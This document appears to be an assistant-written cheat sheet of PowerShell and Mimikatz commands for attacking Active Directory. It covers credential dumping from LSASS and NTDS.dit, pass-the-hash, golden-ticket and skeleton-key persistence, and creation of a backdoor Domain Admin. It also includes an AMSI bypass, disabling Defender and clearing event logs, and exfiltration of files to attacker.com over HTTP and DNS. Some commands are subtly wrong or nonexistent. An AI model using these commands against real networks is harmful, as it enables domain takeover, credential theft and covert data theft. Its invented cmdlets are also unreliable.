Here’s an **Active Directory (AD) Attack Cheat Sheet** specifically for red teamers and penetration testers. This cheat sheet focuses on common attack vectors, enumeration, privilege escalation, lateral movement, persistence, and defense evasion in Active Directory environments.

---

### **1. AD Enumeration**

#### **Enumerate Domain Controllers**
```powershell
Get-ADDomainController -Filter *
```

#### **Get Domain Information**
```powershell
Get-ADDomain
```

#### **Get Forest Information**
```powershell
Get-ADForest
```

#### **List All Domain Users**
```powershell
Get-ADUser -Filter * -Properties DisplayName, EmailAddress, MemberOf | Select-Object Name, DisplayName, EmailAddress
```

#### **List All Domain Groups**
```powershell
Get-ADGroup -Filter * | Select-Object Name
```

#### **Get Members of a Specific Group**
```powershell
Get-ADGroupMember -Identity "GroupName"
```

#### **List Domain Admins**
```powershell
Get-ADGroupMember -Identity "Domain Admins"
```

#### **Find Computers in the Domain**
```powershell
Get-ADComputer -Filter * | Select-Object Name, IPv4Address
```

#### **Get Users with Password Never Expires**
```powershell
Search-ADAccount -PasswordNeverExpires -UsersOnly
```

#### **Find User's Last Logon**
```powershell
Get-ADUser -Identity "username" -Properties LastLogonDate
```

---

### **2. Credential Harvesting**

#### **Dump Credentials from LSASS (Mimikatz)**
```powershell
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

#### **Extract Kerberos Tickets (Using Mimikatz)**
```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
```

#### **Dump NTDS.dit (Domain Controller Database)**
```powershell
ntdsutil "ac i ntds" "ifm" "create full c:\ntds_dump" quit
```

#### **Kerberoasting (Request TGS for SPN)**
```powershell
Add-Type -AssemblyName System.IdentityModel  
$creds = Get-Credential  
$spns = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName  
foreach ($spn in $spns) {  
    Invoke-Kerberoast -Identity $spn -Credential $creds  
}
```

---

### **3. Lateral Movement**

#### **Pass-the-Hash**
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:HASH /run:powershell.exe"'
```

#### **Pass-the-Ticket (Using Mimikatz)**
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt /ticket:krbtgt_ticket.kirbi"'
```

#### **WMI for Remote Command Execution**
```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -EncodedCommand <Base64_Encoded_Command>" -ComputerName "target-PC"
```

#### **Remote PowerShell Session**
```powershell
Enter-PSSession -ComputerName target-PC -Credential DOMAIN\user
```

#### **Invoke Command on Remote Machine**
```powershell
Invoke-Command -ComputerName target-PC -ScriptBlock { Get-Process }
```

---

### **4. Privilege Escalation**

#### **Enumerate Local Administrators on Machines**
```powershell
Invoke-Command -ComputerName target-PC -ScriptBlock { Get-LocalGroupMember -Group "Administrators" }
```

#### **Enumerate Privileged Accounts**
```powershell
Get-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount
```

#### **Get Delegated Privileges**
```powershell
Get-ADUser -Filter {IsPrivileged -eq $True} -Properties MemberOf
```

#### **Abuse SeBackupPrivilege (Backup Operator Privileges)**
```powershell
Invoke-SeBackupPrivilege -Command { Get-Content C:\Windows\System32\config\SAM }
```

#### **Get Users with Replication Rights**
```powershell
Get-ADUser -Filter {MemberOf -eq 'CN=Replication Group,CN=Users,DC=domain,DC=com'}
```

#### **Exploit Unconstrained Delegation**
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
```

---

### **5. Persistence**

#### **Create a New Domain Admin Account**
```powershell
New-ADUser -Name "Backdoor" -AccountPassword (ConvertTo-SecureString "SuperSecret123!" -AsPlainText -Force) -PassThru | Enable-ADAccount
Add-ADGroupMember -Identity "Domain Admins" -Members "Backdoor"
```

#### **Add User to Domain Admins Group**
```powershell
Add-ADGroupMember -Identity "Domain Admins" -Members "Backdoor"
```

#### **Golden Ticket Attack (Mimikatz)**
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:HASH /id:500 /ticket:golden.kirbi"'
```

#### **Skeleton Key Attack (Mimikatz)**
```powershell
Invoke-Mimikatz -Command '"misc::skeleton"'
```

---

### **6. Data Exfiltration**

#### **Dump All Domain User Password Hashes**
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' 
```

#### **Download Files from a Target**
```powershell
Invoke-Command -ComputerName target-PC -ScriptBlock { Copy-Item C:\sensitive.txt -Destination \\attacker-PC\share }
```

#### **Exfiltrate Data Over DNS**
```powershell
nslookup $(Get-Content C:\sensitive.txt) attacker.com
```

#### **Exfiltrate Files to a Web Server**
```powershell
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method Post -InFile "C:\sensitive.txt"
```

---

### **7. Trust Exploitation & Forest Attack**

#### **Enumerate Trusts Between Domains**
```powershell
Get-ADTrust -Filter *
```

#### **Abuse Forest Trust for Lateral Movement**
```powershell
Invoke-Command -ComputerName target-forest-PC -Credential forest\user
```

#### **SID History Injection (Using Mimikatz)**
```powershell
Invoke-Mimikatz -Command '"lsadump::sid /inject /user:Backdoor /sid:S-1-5-21-..."'
```

#### **MS-DS-MachineAccountQuota Exploit**
```powershell
New-ADComputer -Name "EvilMachine" -SamAccountName "EvilMachine" -Instance (New-Object Microsoft.ActiveDirectory.Management.ADComputer) -PassThru | Set-ADObject -Add @{servicePrincipalName='EvilMachine/evilmachine.domain.com'}
```

---

### **8. Defense Evasion**

#### **Disable Windows Defender**
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

#### **Bypass PowerShell ScriptBlock Logging**
```powershell
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
```

#### **Clear Event Logs**
```powershell
wevtutil cl Application
wevtutil cl Security
wevtutil cl System
```

#### **AMSI Bypass**
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### **Obfuscate PowerShell Commands**
```powershell
$p = "calc"; & ([ScriptBlock]::Create($p))
```

---

### **9. Kerberos Attacks**

#### **Dump Kerberos Tickets**
```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

#### **AS-REP Roasting (For Users Without Preauth)**
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

#### **Overpass-the-Hash Attack**
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:DOMAIN /aes128:HASH /run:powershell.exe"'
```

#### **Perform a Kerberoasting Attack**
```powershell
Get-DomainUser -SPN | Get-DomainSPNTicket | Export-Credentials
```

#### **Brute Force Kerberos TGT Request (AS-REP Brute Force)**
```powershell
Invoke-ASREPRoast -Domain DOMAIN -UsersFile users.txt
```

---

### **10. Cleaning Up**

#### **Remove Scheduled Task**
```powershell
Unregister-ScheduledTask -TaskName "BackdoorTask" -Confirm:$false
```

#### **Delete Created User**
```powershell
Remove-ADUser -Identity "Backdoor"
```

#### **Clear Event Logs**
```powershell
Clear-EventLog -LogName "Application"
```

#### **Clear PowerShell History**
```powershell
Remove-Item (Get-PSReadlineOption).

HistorySavePath
```

---

### **Key Tips for Active Directory Pentesting**

- **Kerberoasting**: Always look for service accounts with SPNs that are vulnerable to Kerberoasting. This is a common AD misconfiguration.
- **Lateral Movement**: Abuse protocols like WMI, PowerShell remoting, and SMB for lateral movement.
- **Persistence**: Use techniques like Golden Tickets and Skeleton Keys to establish long-term persistence.
- **Evasion**: Disable or bypass security features such as AMSI and Windows Defender to prevent detection.
- **Privilege Escalation**: Look for unconstrained delegation, misconfigured trusts, and high-privilege accounts to escalate privileges.

---

This cheat sheet should serve as a quick reference guide for attacking Active Directory environments during red team operations or penetration tests. Always ensure you have the proper authorization before conducting any security testing!